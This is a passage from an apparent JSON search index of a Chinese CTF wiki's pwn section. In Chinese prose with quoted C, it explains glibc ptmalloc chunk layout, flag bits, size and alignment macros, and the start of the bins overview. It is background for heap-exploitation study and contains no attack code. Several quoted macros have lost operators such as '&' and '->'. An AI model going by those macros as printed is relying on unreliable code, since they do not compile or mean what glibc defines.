(INTERNAL_SIZE_T))  /* The corresponding bit mask value.  */  #define MALLOC_ALIGN_MASK (MALLOC_ALIGNMENT - 1)   \u4e00\u822c\u6765\u8bf4\uff0csize_t \u5728 64 \u4f4d\u4e2d\u662f 64 \u4f4d\u65e0\u7b26\u53f7\u6574\u6570\uff0c32 \u4f4d\u4e2d\u662f 32 \u4f4d\u65e0\u7b26\u53f7\u6574\u6570\u3002  \u6bcf\u4e2a\u5b57\u6bb5\u7684\u5177\u4f53\u7684\u89e3\u91ca\u5982\u4e0b   prev_size ,  \u5982\u679c\u8be5 chunk \u7684 \u7269\u7406\u76f8\u90bb\u7684\u524d\u4e00\u5730\u5740chunk\uff08\u4e24\u4e2a\u6307\u9488\u7684\u5730\u5740\u5dee\u503c\u4e3a\u524d\u4e00chunk\u5927\u5c0f\uff09 \u662f\u7a7a\u95f2\u7684\u8bdd\uff0c\u90a3\u8be5\u5b57\u6bb5\u8bb0\u5f55\u7684\u662f\u524d\u4e00\u4e2a chunk \u7684\u5927\u5c0f(\u5305\u62ec chunk \u5934)\u3002\u5426\u5219\uff0c\u8be5\u5b57\u6bb5\u53ef\u4ee5\u7528\u6765\u5b58\u50a8\u7269\u7406\u76f8\u90bb\u7684\u524d\u4e00\u4e2achunk \u7684\u6570\u636e\u3002 \u8fd9\u91cc\u7684\u524d\u4e00 chunk \u6307\u7684\u662f\u8f83\u4f4e\u5730\u5740\u7684 chunk  \u3002  size  \uff0c\u8be5 chunk \u7684\u5927\u5c0f\uff0c\u5927\u5c0f\u5fc5\u987b\u662f 2 * SIZE_SZ \u7684\u6574\u6570\u500d\u3002\u5982\u679c\u7533\u8bf7\u7684\u5185\u5b58\u5927\u5c0f\u4e0d\u662f 2 * SIZE_SZ \u7684\u6574\u6570\u500d\uff0c\u4f1a\u88ab\u8f6c\u6362\u6ee1\u8db3\u5927\u5c0f\u7684\u6700\u5c0f\u7684 2 * SIZE_SZ \u7684\u500d\u6570\u300232 \u4f4d\u7cfb\u7edf\u4e2d\uff0cSIZE_SZ \u662f 4\uff1b64 \u4f4d\u7cfb\u7edf\u4e2d\uff0cSIZE_SZ \u662f 8\u3002 \u8be5\u5b57\u6bb5\u7684\u4f4e\u4e09\u4e2a\u6bd4\u7279\u4f4d\u5bf9 chunk \u7684\u5927\u5c0f\u6ca1\u6709\u5f71\u54cd\uff0c\u5b83\u4eec\u4ece\u9ad8\u5230\u4f4e\u5206\u522b\u8868\u793a  NON_MAIN_ARENA\uff0c\u8bb0\u5f55\u5f53\u524d chunk \u662f\u5426\u4e0d\u5c5e\u4e8e\u4e3b\u7ebf\u7a0b\uff0c1\u8868\u793a\u4e0d\u5c5e\u4e8e\uff0c0\u8868\u793a\u5c5e\u4e8e\u3002  IS_MAPPED\uff0c\u8bb0\u5f55\u5f53\u524d chunk \u662f\u5426\u662f\u7531 mmap \u5206\u914d\u7684\u3002   PREV_INUSE\uff0c\u8bb0\u5f55\u524d\u4e00\u4e2a chunk \u5757\u662f\u5426\u88ab\u5206\u914d\u3002\u4e00\u822c\u6765\u8bf4\uff0c\u5806\u4e2d\u7b2c\u4e00\u4e2a\u88ab\u5206\u914d\u7684\u5185\u5b58\u5757\u7684 size \u5b57\u6bb5\u7684P\u4f4d\u90fd\u4f1a\u88ab\u8bbe\u7f6e\u4e3a1\uff0c\u4ee5\u4fbf\u4e8e\u9632\u6b62\u8bbf\u95ee\u524d\u9762\u7684\u975e\u6cd5\u5185\u5b58\u3002\u5f53\u4e00\u4e2a chunk \u7684 size \u7684 P \u4f4d\u4e3a 0 \u65f6\uff0c\u6211\u4eec\u80fd\u901a\u8fc7 prev_size \u5b57\u6bb5\u6765\u83b7\u53d6\u4e0a\u4e00\u4e2a chunk \u7684\u5927\u5c0f\u4ee5\u53ca\u5730\u5740\u3002\u8fd9\u4e5f\u65b9\u4fbf\u8fdb\u884c\u7a7a\u95f2chunk\u4e4b\u95f4\u7684\u5408\u5e76\u3002    fd\uff0cbk \u3002 chunk \u5904\u4e8e\u5206\u914d\u72b6\u6001\u65f6\uff0c\u4ece fd \u5b57\u6bb5\u5f00\u59cb\u662f\u7528\u6237\u7684\u6570\u636e\u3002chunk \u7a7a\u95f2\u65f6\uff0c\u4f1a\u88ab\u6dfb\u52a0\u5230\u5bf9\u5e94\u7684\u7a7a\u95f2\u7ba1\u7406\u94fe\u8868\u4e2d\uff0c\u5176\u5b57\u6bb5\u7684\u542b\u4e49\u5982\u4e0b  fd \u6307\u5411\u4e0b\u4e00\u4e2a\uff08\u975e\u7269\u7406\u76f8\u90bb\uff09\u7a7a\u95f2\u7684 chunk  bk \u6307\u5411\u4e0a\u4e00\u4e2a\uff08\u975e\u7269\u7406\u76f8\u90bb\uff09\u7a7a\u95f2\u7684 chunk  \u901a\u8fc7 fd \u548c bk \u53ef\u4ee5\u5c06\u7a7a\u95f2\u7684 chunk \u5757\u52a0\u5165\u5230\u7a7a\u95f2\u7684 chunk \u5757\u94fe\u8868\u8fdb\u884c\u7edf\u4e00\u7ba1\u7406    fd_nextsize\uff0c bk_nextsize \uff0c\u4e5f\u662f\u53ea\u6709 chunk \u7a7a\u95f2\u7684\u65f6\u5019\u624d\u4f7f\u7528\uff0c\u4e0d\u8fc7\u5176\u7528\u4e8e\u8f83\u5927\u7684 chunk\uff08large chunk\uff09\u3002  fd_nextsize \u6307\u5411\u524d\u4e00\u4e2a\u4e0e\u5f53\u524d chunk \u5927\u5c0f\u4e0d\u540c\u7684\u7b2c\u4e00\u4e2a\u7a7a\u95f2\u5757\uff0c\u4e0d\u5305\u542b bin \u7684\u5934\u6307\u9488\u3002  bk_nextsize \u6307\u5411\u540e\u4e00\u4e2a\u4e0e\u5f53\u524d chunk \u5927\u5c0f\u4e0d\u540c\u7684\u7b2c\u4e00\u4e2a\u7a7a\u95f2\u5757\uff0c\u4e0d\u5305\u542b bin \u7684\u5934\u6307\u9488\u3002  \u4e00\u822c\u7a7a\u95f2\u7684 large chunk \u5728 fd \u7684\u904d\u5386\u987a\u5e8f\u4e2d\uff0c\u6309\u7167\u7531\u5927\u5230\u5c0f\u7684\u987a\u5e8f\u6392\u5217\u3002 \u8fd9\u6837\u505a\u53ef\u4ee5\u907f\u514d\u5728\u5bfb\u627e\u5408\u9002chunk \u65f6\u6328\u4e2a\u904d\u5386\u3002     \u4e00\u4e2a\u5df2\u7ecf\u5206\u914d\u7684 chunk \u7684\u6837\u5b50\u5982\u4e0b\u3002 \u6211\u4eec\u79f0\u524d\u4e24\u4e2a\u5b57\u6bb5\u79f0\u4e3a chunk header\uff0c\u540e\u9762\u7684\u90e8\u5206\u79f0\u4e3auser data\u3002\u6bcf\u6b21 malloc \u7533\u8bf7\u5f97\u5230\u7684\u5185\u5b58\u6307\u9488\uff0c\u5176\u5b9e\u6307\u5411user data\u7684\u8d77\u59cb\u5904\u3002    \u5f53\u4e00\u4e2a chunk \u5904\u4e8e\u4f7f\u7528\u72b6\u6001\u65f6\uff0c\u5b83\u7684\u4e0b\u4e00\u4e2a chunk \u7684 prev_size \u57df\u65e0\u6548\uff0c\u6240\u4ee5\u4e0b\u4e00\u4e2a chunk \u7684\u8be5\u90e8\u5206\u4e5f\u53ef\u4ee5\u88ab\u5f53\u524dchunk\u4f7f\u7528\u3002 \u8fd9\u5c31\u662fchunk\u4e2d\u7684\u7a7a\u95f4\u590d\u7528\u3002  chunk -   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ \n         |               Size   of   previous   chunk ,   if   unallocated   ( P   clear )    | \n         +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ \n         |               Size   of   chunk ,   in   bytes                       | A | M | P | \n   mem -   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ \n         |               User   data   starts   here ...                            . \n         .                                                                 . \n         .               ( malloc_usable_size ()   bytes )                        .  next      .                                                                 |  chunk -   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ \n         |               ( size   of   chunk ,   but   used   for   application   data )      | \n         +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ \n         |               Size   of   next   chunk ,   in   bytes                  | A | 0 | 1 | \n         +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+   \u88ab\u91ca\u653e\u7684 chunk \u88ab\u8bb0\u5f55\u5728\u94fe\u8868\u4e2d\uff08\u53ef\u80fd\u662f\u5faa\u73af\u53cc\u5411\u94fe\u8868\uff0c\u4e5f\u53ef\u80fd\u662f\u5355\u5411\u94fe\u8868\uff09\u3002\u5177\u4f53\u7ed3\u6784\u5982\u4e0b  chunk -   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ \n         |               Size   of   previous   chunk ,   if   unallocated   ( P   clear )    | \n         +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+  ` head :   |               Size   of   chunk ,   in   bytes                       | A | 0 | P | \n   mem -   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ \n         |               Forward   pointer   to   next   chunk   in   list               | \n         +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ \n         |               Back   pointer   to   previous   chunk   in   list              | \n         +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ \n         |               Unused   space   ( may   be   0   bytes   long )                  . \n         .                                                                 . \n  next     .                                                                 |  chunk -   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+  ` foot :   |               Size   of   chunk ,   in   bytes                             | \n         +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ \n         |               Size   of   next   chunk ,   in   bytes                  | A | 0 | 0 | \n         +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+   \u53ef\u4ee5\u53d1\u73b0\uff0c\u5982\u679c\u4e00\u4e2a chunk \u5904\u4e8e free \u72b6\u6001\uff0c\u90a3\u4e48\u4f1a\u6709\u4e24\u4e2a\u4f4d\u7f6e\u8bb0\u5f55\u5176\u76f8\u5e94\u7684\u5927\u5c0f    \u672c\u8eab\u7684size\u5b57\u6bb5\u4f1a\u8bb0\u5f55\uff0c    \u5b83\u540e\u9762\u7684 chunk \u4f1a\u8bb0\u5f55\u3002    \u4e00\u822c\u60c5\u51b5\u4e0b \uff0c\u7269\u7406\u76f8\u90bb\u7684\u4e24\u4e2a\u7a7a\u95f2 chunk \u4f1a\u88ab\u5408\u5e76\u4e3a\u4e00\u4e2a chunk \u3002\u5806\u7ba1\u7406\u5668\u4f1a\u901a\u8fc7 prev_size \u5b57\u6bb5\u4ee5\u53ca size \u5b57\u6bb5\u5408\u5e76\u4e24\u4e2a\u7269\u7406\u76f8\u90bb\u7684\u7a7a\u95f2 chunk \u5757\u3002  \uff01\uff01\uff01\u4e00\u4e9b\u5173\u4e8e\u5806\u7684\u7ea6\u675f\uff0c\u540e\u9762\u8be6\u7ec6\u8003\u8651\uff01\uff01\uff01  /*      The three exceptions to all this are:       1. The special chunk `top  doesn t bother using the      trailing size field since there is no next contiguous chunk      that would have to index off it. After initialization, `top      is forced to always exist.  If it would become less than      MINSIZE bytes long, it is replenished.       2. Chunks allocated via mmap, which have the second-lowest-order      bit M (IS_MMAPPED) set in their size fields.  Because they are      allocated one-by-one, each must contain its own trailing size      field.  If the M bit is set, the other bits are ignored      (because mmapped chunks are neither in an arena, nor adjacent      to a freed chunk).  The M bit is also used for chunks which      originally came from a dumped heap via malloc_set_state in      hooks.c.       3. Chunks in fastbins are treated as allocated chunks from the      point of view of the chunk allocator.  They are consolidated      with their neighbors only in bulk, in malloc_consolidate.  */", 
            "title": "\u6982\u8ff0"
        }, 
        {
            "location": "/pwn/heap/heap_structure/#chunk", 
            "text": "\u8fd9\u91cc\u4e3b\u8981\u4ecb\u7ecd chunk \u7684\u5927\u5c0f\u3001\u5bf9\u9f50\u68c0\u67e5\u4ee5\u53ca\u4e00\u4e9b\u8f6c\u6362\u7684\u5b8f\u3002  chunk \u4e0e mem \u6307\u9488\u5934\u90e8\u7684\u8f6c\u6362  mem\u6307\u5411\u7528\u6237\u5f97\u5230\u7684\u5185\u5b58\u7684\u8d77\u59cb\u4f4d\u7f6e\u3002  /* conversion from malloc headers to user pointers, and back */  #define chunk2mem(p) ((void *) ((char *) (p) + 2 * SIZE_SZ))  #define mem2chunk(mem) ((mchunkptr)((char *) (mem) -2 * SIZE_SZ))   \u6700\u5c0f\u7684 chunk \u5927\u5c0f  /* The smallest possible chunk */  #define MIN_CHUNK_SIZE (offsetof(struct malloc_chunk, fd_nextsize))   \u8fd9\u91cc\uff0coffsetof \u51fd\u6570\u8ba1\u7b97\u51fa fd_nextsize \u5728 malloc_chunk \u4e2d\u7684\u504f\u79fb\uff0c\u8bf4\u660e\u6700\u5c0f\u7684 chunk \u81f3\u5c11\u8981\u5305\u542b bk \u6307\u9488\u3002  \u6700\u5c0f\u7533\u8bf7\u7684\u5806\u5185\u5b58\u5927\u5c0f  \u7528\u6237\u6700\u5c0f\u7533\u8bf7\u7684\u5185\u5b58\u5927\u5c0f\u5fc5\u987b\u662f 2 * SIZE_SZ \u7684\u6700\u5c0f\u6574\u6570\u500d\u3002  \u6ce8\uff1a\u5c31\u76ee\u524d\u800c\u770b MIN_CHUNK_SIZE \u548c MINSIZE \u5927\u5c0f\u662f\u4e00\u81f4\u7684\uff0c\u4e2a\u4eba\u8ba4\u4e3a\u4e4b\u6240\u4ee5\u8981\u6dfb\u52a0\u4e24\u4e2a\u5b8f\u662f\u4e3a\u4e86\u65b9\u4fbf\u4ee5\u540e\u4fee\u6539 malloc_chunk \u65f6\u65b9\u4fbf\u4e00\u4e9b\u3002  /* The smallest size we can malloc is an aligned minimal chunk */  //MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1  #define MINSIZE                                                                \\      (unsigned long) (((MIN_CHUNK_SIZE + MALLOC_ALIGN_MASK)                     \\                        ~MALLOC_ALIGN_MASK))   \u68c0\u67e5\u5206\u914d\u7ed9\u7528\u6237\u7684\u5185\u5b58\u662f\u5426\u5bf9\u9f50  2 * SIZE_SZ \u5927\u5c0f\u5bf9\u9f50\u3002  /* Check if m has acceptable alignment */  // MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1  #define aligned_OK(m) (((unsigned long) (m)   MALLOC_ALIGN_MASK) == 0)  #define misaligned_chunk(p)                                                    \\      ((uintptr_t)(MALLOC_ALIGNMENT == 2 * SIZE_SZ ? (p) : chunk2mem(p))         \\       MALLOC_ALIGN_MASK)   \u8bf7\u6c42\u5b57\u8282\u6570\u5224\u65ad  /*     Check if a request is so large that it would wrap around zero when     padded and aligned. To simplify some other code, the bound is made     low enough so that adding MINSIZE will also not wrap around zero.   */  #define REQUEST_OUT_OF_RANGE(req)                                              \\      ((unsigned long) (req)  = (unsigned long) (INTERNAL_SIZE_T)(-2 * MINSIZE))   \u5c06\u7528\u6237\u8bf7\u6c42\u5185\u5b58\u5927\u5c0f\u8f6c\u4e3a\u5b9e\u9645\u5206\u914d\u5185\u5b58\u5927\u5c0f  /* pad request bytes into a usable size -- internal version */  //MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1  #define request2size(req)                                                      \\      (((req) + SIZE_SZ + MALLOC_ALIGN_MASK   MINSIZE)                           \\           ? MINSIZE                                                             \\           : ((req) + SIZE_SZ + MALLOC_ALIGN_MASK)   ~MALLOC_ALIGN_MASK)  /*  Same, except also perform argument check */  #define checked_request2size(req, sz)                                          \\      if (REQUEST_OUT_OF_RANGE(req)) {                                           \\          __set_errno(ENOMEM);                                                   \\          return 0;                                                              \\      }                                                                          \\      (sz) = request2size(req);   \u5f53\u4e00\u4e2a chunk \u5904\u4e8e\u5df2\u5206\u914d\u72b6\u6001\u65f6\uff0c\u5b83\u7684\u7269\u7406\u76f8\u90bb\u7684\u4e0b\u4e00\u4e2a chunk \u7684 prev_size \u5b57\u6bb5\u5fc5\u7136\u662f\u65e0\u6548\u7684\uff0c\u6545\u800c\u8fd9\u4e2a\u5b57\u6bb5\u5c31\u53ef\u4ee5\u88ab\u5f53\u524d\u8fd9\u4e2a chunk \u4f7f\u7528\u3002\u8fd9\u5c31\u662f ptmalloc \u4e2d chunk \u95f4\u7684\u590d\u7528\u3002\u5177\u4f53\u6d41\u7a0b\u5982\u4e0b   \u9996\u5148\uff0c\u5229\u7528 REQUEST_OUT_OF_RANGE \u5224\u65ad\u662f\u5426\u53ef\u4ee5\u5206\u914d\u7528\u6237\u8bf7\u6c42\u7684\u5b57\u8282\u5927\u5c0f\u7684 chunk\u3002  \u5176\u6b21\uff0c\u9700\u8981\u6ce8\u610f\u7684\u662f\u7528\u6237\u8bf7\u6c42\u7684\u5b57\u8282\u662f\u7528\u6765\u5b58\u50a8\u6570\u636e\u7684\uff0c\u5373 chunk header \u540e\u9762\u7684\u90e8\u5206\u3002\u4e0e\u6b64\u540c\u65f6\uff0c\u7531\u4e8echunk \u95f4\u590d\u7528\uff0c\u6240\u4ee5\u53ef\u4ee5\u4f7f\u7528\u4e0b\u4e00\u4e2a chunk \u7684 prev_size \u5b57\u6bb5\u3002\u56e0\u6b64\uff0c\u8fd9\u91cc\u53ea\u9700\u8981\u518d\u6dfb\u52a0 SIZE_SZ \u5927\u5c0f\u5373\u53ef\u4ee5\u5b8c\u5168\u5b58\u50a8\u5185\u5bb9\u3002  \u7531\u4e8e\u7cfb\u7edf\u4e2d\u6240\u5141\u8bb8\u7684\u7533\u8bf7\u7684 chunk \u6700\u5c0f\u662f MINSIZE\uff0c\u6240\u4ee5\u4e0e\u5176\u8fdb\u884c\u6bd4\u8f83\u3002\u5982\u679c\u4e0d\u6ee1\u8db3\u6700\u4f4e\u8981\u6c42\uff0c\u90a3\u4e48\u5c31\u9700\u8981\u76f4\u63a5\u5206\u914dMINSIZE\u5b57\u8282\u3002  \u5982\u679c\u5927\u4e8e\u7684\u8bdd\uff0c\u56e0\u4e3a\u7cfb\u7edf\u4e2d\u7533\u8bf7\u7684 chunk \u9700\u8981 2 * SIZE_SZ \u5bf9\u9f50\uff0c\u6240\u4ee5\u8fd9\u91cc\u9700\u8981\u52a0\u4e0aMALLOC_ALIGN_MASK \u4ee5\u4fbf\u4e8e\u5bf9\u9f50\u3002   \u4e2a\u4eba\u8ba4\u4e3a\uff0c\u8fd9\u91cc\u5728 request2size \u7684\u5b8f\u7684\u7b2c\u4e00\u884c\u4e2d\u6ca1\u6709\u5fc5\u8981\u52a0\u4e0a MALLOC_ALIGN_MASK\u3002  \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u901a\u8fc7\u8fd9\u6837\u7684\u8ba1\u7b97\u516c\u5f0f\u5f97\u5230\u7684 size \u6700\u7ec8\u4e00\u5b9a\u662f\u6ee1\u8db3\u7528\u6237\u9700\u8981\u7684\u3002  \u6807\u8bb0\u4f4d\u76f8\u5173  /* size field is or ed with PREV_INUSE when previous adjacent chunk in use */  #define PREV_INUSE 0x1  /* extract inuse bit of previous chunk */  #define prev_inuse(p) ((p)- mchunk_size   PREV_INUSE)  /* size field is or ed with IS_MMAPPED if the chunk was obtained with mmap() */  #define IS_MMAPPED 0x2  /* check for mmap() ed chunk */  #define chunk_is_mmapped(p) ((p)- mchunk_size   IS_MMAPPED)  /* size field is or ed with NON_MAIN_ARENA if the chunk was obtained     from a non-main arena.  This is only set immediately before handing     the chunk to the user, if necessary.  */  #define NON_MAIN_ARENA 0x4  /* Check for chunk from main arena.  */  #define chunk_main_arena(p) (((p)- mchunk_size   NON_MAIN_ARENA) == 0)  /* Mark a chunk as not being on the main arena.  */  #define set_non_main_arena(p) ((p)- mchunk_size |= NON_MAIN_ARENA)  /*     Bits to mask off when extracting size     Note: IS_MMAPPED is intentionally not masked off from size field in     macros for which mmapped chunks should never be seen. This should     cause helpful core dumps to occur if it is tried by accident by     people extending or adapting this malloc.   */  #define SIZE_BITS (PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)   \u83b7\u53d6chunk size  /* Get size, ignoring use bits */  #define chunksize(p) (chunksize_nomask(p)   ~(SIZE_BITS))  /* Like chunksize, but do not mask SIZE_BITS.  */  #define chunksize_nomask(p) ((p)- mchunk_size)   \u83b7\u53d6\u4e0b\u4e00\u4e2a\u7269\u7406\u76f8\u90bb\u7684chunk  /* Ptr to next physical malloc_chunk. */  #define next_chunk(p) ((mchunkptr)(((char *) (p)) + chunksize(p)))   \u83b7\u53d6\u524d\u4e00\u4e2achunk\u7684\u4fe1\u606f  /* Size of the chunk below P.  Only valid if prev_inuse (P).  */  #define prev_size(p) ((p)- mchunk_prev_size)  /* Set the size of the chunk below P.  Only valid if prev_inuse (P).  */  #define set_prev_size(p, sz) ((p)- mchunk_prev_size = (sz))  /* Ptr to previous physical malloc_chunk.  Only valid if prev_inuse (P).  */  #define prev_chunk(p) ((mchunkptr)(((char *) (p)) - prev_size(p)))   \u5f53\u524dchunk\u4f7f\u7528\u72b6\u6001\u76f8\u5173\u64cd\u4f5c  /* extract p s inuse bit */  #define inuse(p)                                                               \\      ((((mchunkptr)(((char *) (p)) + chunksize(p)))- mchunk_size)   PREV_INUSE)  /* set/clear chunk as being inuse without otherwise disturbing */  #define set_inuse(p)                                                           \\      ((mchunkptr)(((char *) (p)) + chunksize(p)))- mchunk_size |= PREV_INUSE  #define clear_inuse(p)                                                         \\      ((mchunkptr)(((char *) (p)) + chunksize(p)))- mchunk_size  = ~(PREV_INUSE)   \u8bbe\u7f6echunk\u7684size\u5b57\u6bb5  /* Set size at head, without disturbing its use bit */  // SIZE_BITS = 7  #define set_head_size(p, s)                                                    \\      ((p)- mchunk_size = (((p)- mchunk_size   SIZE_BITS) | (s)))  /* Set size/use field */  #define set_head(p, s) ((p)- mchunk_size = (s))  /* Set size at footer (only when chunk is not in use) */  #define set_foot(p, s)                                                         \\      (((mchunkptr)((char *) (p) + (s)))- mchunk_prev_size = (s))   \u83b7\u53d6\u6307\u5b9a\u504f\u79fb\u7684chunk  /* Treat space at ptr + offset as a chunk */  #define chunk_at_offset(p, s) ((mchunkptr)(((char *) (p)) + (s)))   \u6307\u5b9a\u504f\u79fb\u5904chunk\u4f7f\u7528\u72b6\u6001\u76f8\u5173\u64cd\u4f5c  /* check/set/clear inuse bits in known places */  #define inuse_bit_at_offset(p, s)                                              \\      (((mchunkptr)(((char *) (p)) + (s)))- mchunk_size   PREV_INUSE)  #define set_inuse_bit_at_offset(p, s)                                          \\      (((mchunkptr)(((char *) (p)) + (s)))- mchunk_size |= PREV_INUSE)  #define clear_inuse_bit_at_offset(p, s)                                        \\      (((mchunkptr)(((char *) (p)) + (s)))- mchunk_size  = ~(PREV_INUSE))", 
            "title": "chunk\u76f8\u5173\u5b8f"
        }, 
        {
            "location": "/pwn/heap/heap_structure/#bin", 
            "text": "", 
            "title": "bin"
        }, 
        {
            "location": "/pwn/heap/heap_structure/#_4", 
            "text": "\u6211\u4eec\u66fe\u7ecf\u8bf4\u8fc7\uff0c\u7528\u6237\u91ca\u653e\u6389\u7684 chunk \u4e0d\u4f1a\u9a6c\u4e0a\u5f52\u8fd8\u7ed9\u7cfb\u7edf\uff0cptmalloc \u4f1a\u7edf\u4e00\u7ba1\u7406 heap \u548c mmap \u6620\u5c04\u533a\u57df\u4e2d\u7684\u7a7a\u95f2\u7684chunk\u3002\u5f53\u7528\u6237\u518d\u4e00\u6b21\u8bf7\u6c42\u5206\u914d\u5185\u5b58\u65f6\uff0cptmalloc \u5206\u914d\u5668\u4f1a\u8bd5\u56fe\u5728\u7a7a\u95f2\u7684chunk\u4e2d\u6311\u9009\u4e00\u5757\u5408\u9002\u7684\u7ed9\u7528\u6237\u3002\u8fd9\u6837\u53ef\u4ee5\u907f\u514d\u9891\u7e41\u7684\u7cfb\u7edf\u8c03\u7528\uff0c\u964d\u4f4e\u5185\u5b58\u5206\u914d\u7684\u5f00\u9500\u3002  \u5728\u5177\u4f53\u7684\u5b9e\u73b0\u4e2d\uff0cptmalloc \u91c7\u7528\u5206\u7bb1\u5f0f\u65b9\u6cd5\u5bf9\u7a7a\u95f2\u7684 chunk \u8fdb\u884c\u7ba1\u7406\u3002\u9996\u5148\uff0c\u5b83\u4f1a\u6839\u636e\u7a7a\u95f2\u7684 chunk \u7684\u5927\u5c0f\u4ee5\u53ca\u4f7f\u7528\u72b6\u6001\u5c06 chunk \u521d\u6b65\u5206\u4e3a4\u7c7b\uff1afast bins\uff0csmall bins\uff0clarge bins\uff0cunsorted bin\u3002\u6bcf\u7c7b\u4e2d\u4ecd\u7136\u6709\u66f4\u7ec6\u7684\u5212\u5206\uff0c\u76f8\u4f3c\u5927\u5c0f\u7684 chunk \u4f1a\u7528\u53cc\u5411\u94fe\u8868\u94fe\u63a5\u8d77\u6765\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u5728\u6bcf\u7c7b bin \u7684\u5185\u90e8\u4ecd\u7136\u4f1a\u6709\u591a\u4e2a\u4e92\u4e0d\u76f8\u5173\u7684\u94fe\u8868\u6765\u4fdd\u5b58\u4e0d\u540c\u5927\u5c0f\u7684 chunk\u3002  \u5bf9\u4e8e small bins\uff0clarge bins\uff0cunsorted bin \u6765\u8bf4\uff0cPtmalloc \u5c06\u5b83\u4eec\u7ef4\u62a4\u5728\u540c\u4e00\u4e2a\u6570\u7ec4\u4e2d\u3002\u8fd9\u4e9bbin\u5bf9\u5e94\u7684\u6570\u636e\u7ed3\u6784\u5728 malloc_state \u4e2d\uff0c\u5982\u4e0b  #define NBINS 128  /* Normal bins packed as described above */  mchunkptr   bins [   NBINS   *   2   -   2   ];   \u867d\u7136\u6bcf\u4e2a bin \u7684\u8868\u5934\u4f7f\u7528 mchunkptr \u8fd9\u4e2a\u6570\u636e\u7ed3\u6784\uff0c\u4f46\u662f\u8fd9\u53ea\u662f\u4e3a\u4e86\u65b9\u4fbf\u6211\u4eec\u5c06\u6bcf\u4e2a bin \u8f6c\u5316\u4e3a malloc_chunk \u6307\u9488\u3002\u6211\u4eec\u5728\u4f7f\u7528\u65f6\uff0c\u4f1a\u5c06\u8fd9\u4e2a\u6307\u9488\u5f53\u505a\u4e00\u4e2a chunk \u7684 fd \u6216 bk \u6307\u9488\u6765\u64cd\u4f5c\uff0c\u4ee5\u4fbf\u4e8e\u5c06\u5904\u4e8e\u7a7a\u95f2\u7684\u5806\u5757\u94fe\u63a5\u5728\u4e00\u8d77\u3002\u8fd9\u6837\u53ef\u4ee5\u8282\u7701\u7a7a\u95f4\uff0c\u5e76\u63d0\u9ad8\u53ef\u7528\u6027\u3002\u90a3\u5230\u5e95\u662f\u600e\u4e48\u8282\u7701\u7684\u5462\uff1f\u8fd9\u91cc\u6211\u4eec\u4ee532\u4f4d\u7cfb\u7edf\u4e3a\u4f8b     \u542b\u4e49  bin1\u7684fd/bin2\u7684prev_size  bin1\u7684bk/bin2\u7684size  bin2\u7684fd/bin3\u7684prev_size  bin2\u7684bk/bin3\u7684size      bin\u4e0b\u6807  0  1  2  3     \u53ef\u4ee5\u770b\u51fa\u9664\u4e86\u7b2c\u4e00\u4e2abin\uff08unsorted bin\uff09\u5916\uff0c\u540e\u9762\u7684\u6bcf\u4e2abin\u4f1a\u5171\u4eab\u524d\u9762\u7684bin\u7684\u5b57\u6bb5\uff0c\u5c06\u5176\u89c6\u4e3amalloc chunk\u90e8\u5206\u7684prev_size\u548csize\u3002\u8fd9\u91cc\u4e5f\u8bf4\u660e\u4e86\u4e00\u4e2a\u95ee\u9898\uff0c bin\u7684\u4e0b\u6807\u548c\u6211\u4eec\u6240\u8bf4\u7684\u7b2c\u51e0\u4e2abin\u5e76\u4e0d\u662f\u4e00\u81f4\u7684\u3002\u540c\u65f6\uff0cbin\u8868\u5934\u7684 chunk \u7684 prev_size \u4e0e size \u5b57\u6bb5\u4e0d\u80fd\u968f\u4fbf\u4fee\u6539\uff0c\u56e0\u4e3a\u8fd9\u4e24\u4e2a\u5b57\u6bb5\u662f\u88ab\u5176\u5b83bin\u6240\u5229\u7528\u7684\u3002  \u6570\u7ec4\u4e2d\u7684 bin \u4f9d\u6b21\u4ecb\u7ecd\u5982\u4e0b   \u7b2c\u4e00\u4e2a\u4e3a unsorted bin\uff0c\u5b57\u5982\u5176\u9762\uff0c\u8fd9\u91cc\u9762\u7684 chunk \u6ca1\u6709\u8fdb\u884c\u6392\u5e8f\uff0c\u5b58\u50a8\u7684 chunk \u6bd4\u8f83\u6742\u3002  \u7d22\u5f15\u4ece 2 \u5230 63 \u7684 bin \u79f0\u4e3a small bin\uff0c\u540c\u4e00\u4e2a small bin \u94fe\u8868\u4e2d\u7684 chunk \u7684\u5927\u5c0f\u76f8\u540c\u3002\u4e24\u4e2a\u76f8\u90bb\u7d22\u5f15\u7684 small bin \u94fe\u8868\u4e2d\u7684 chunk \u5927\u5c0f\u76f8\u5dee\u7684\u5b57\u8282\u6570\u4e3a 2\u4e2a\u673a\u5668\u5b57\u957f 